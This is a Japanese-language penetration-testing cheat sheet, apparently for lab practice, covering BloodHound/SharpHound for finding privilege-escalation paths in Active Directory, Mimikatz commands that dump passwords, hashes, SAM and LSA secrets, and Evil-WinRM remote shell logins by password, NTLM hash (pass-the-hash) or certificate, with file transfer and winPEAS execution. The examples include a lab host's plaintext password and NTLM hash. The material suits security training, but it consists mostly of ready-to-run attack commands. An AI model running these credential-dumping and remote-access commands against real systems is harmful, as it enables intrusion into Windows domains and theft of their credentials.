# 目次
1. [BloodHound](#bloodhound)
2. [Mimikatz](#mimikatz)
3. [Evil-WinRM](#evil-winrm)

---

## BloodHound

BloodHound ([GitHubリンク](https://github.com/BloodHoundAD/BloodHound)) は、グラフ理論に基づきActive Directory環境の意図しない関係性を明らかにするためのツールです。これにより、低特権ユーザーをDomain Adminsに昇格させるためのパスを発見することができます。詳細については、[Qiita記事](https://qiita.com/v_avenger/items/56ef4ae521af6579c058)をご覧ください。

### 操作手順

1. **ターゲットAD上でSharpHound.exeを実行する**
   - SharpHoundは、Active Directoryの情報を収集し、関係性を解析するツールです。
   
2. **作成された日付入りのzipファイルをKali上に転送する**
   - ファイルを転送するには、`scp`や`ftp`などのツールを使用します。

3. **neo4jの起動**
   - BloodHoundはNeo4jデータベースを使用してグラフデータを管理します。
![image](https://github.com/user-attachments/assets/f9998f0a-ad2a-48f6-9c86-a376e79806f0)

4. **BloodHoundの起動**
   - Neo4jが起動したら、BloodHoundを実行し、収集したデータをアップロードします。
![image](https://github.com/user-attachments/assets/2460d64b-eb99-4260-955c-29d846cf9421)

---

## Mimikatz

Mimikatzは、Windowsシステムのパスワードやハッシュをダンプするためのツールです。

### 基本コマンド

- **パスワードとハッシュのダンプ**

  ```bash
  privilege::debug
  sekurlsa::logonpasswords
  ```

- **SAMとLSAのダンプ**

  ```bash
  lsadump::sam
  lsadump::lsa /patch
  ```

- **ワンライナーでの実行**

  ```bash
  .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  ```

  ![Mimikatz Example](https://github.com/user-attachments/assets/80751d7c-e8fe-4d86-a690-98426942fdff)

---

## Evil-WinRM

WinRM（Windows Remote Management）は、MicrosoftのWS-Management Protocolの実装です。リモートシェルプログラムとしてEvil-WinRMを使用することで、WinRMサービスが有効なリモートWindowsサーバーに接続できます。

### WinRMサービスの発見

- **ポート5985（平文プロトコル）および5986（暗号化されたプロトコル）のスキャン**

  ```bash
  nmap -p5985,5986 <IP>
  ```

### ログイン方法

- **パスワードでログイン**

  ```bash
  evil-winrm -i <IP> -u user -p pass
  evil-winrm -i <IP> -u user -p pass -S
  ```

- **ハッシュでログイン**

  ```bash
  evil-winrm -i <IP> -u user -H ntlmhash
  ```

- **キーでログイン**

  ```bash
  evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S
  ```

### ログの表示

- **ログ表示**

  ```bash
  evil-winrm -i <IP> -u user -p pass -l
  ```

### ファイルのアップロードとダウンロード

- **ファイルのアップロード**

  ```bash
  upload <file>
  ```

- **ファイルのダウンロード**

  ```bash
  download <file> <filepath-kali>
  ```

- **Kaliから直接ファイルを読み込む**

  ```bash
  evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell
  ```

### Evil-WinRMコマンド

- **コマンドメニューの表示**

  ```bash
  menu
  ```

- **バイナリの実行**

  ```bash
  evil-winrm -i <IP> -u user -p pass -e /opt/privsc
  Invoke-Binary /opt/privsc/winPEASx64.exe
  ```

  ![Evil-WinRM Example](https://github.com/user-attachments/assets/3f9ef784-7508-431b-9423-8619fc59e637)

- **パスワードログイン例**

  ```bash
  evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
  ```
  ![Password Login](https://github.com/user-attachments/assets/7020f363-a6ca-46b9-9f53-37b00809c45a)

- **ハッシュ値によるログイン例**

  ```bash
  evil-winrm -i 10.10.11.14 -u localadmin -H 9aa582783780d1546d62f2d102daefae
  ```
  ![Example](https://github.com/user-attachments/assets/764171ae-cf49-4710-95a5-508452d37fe3)
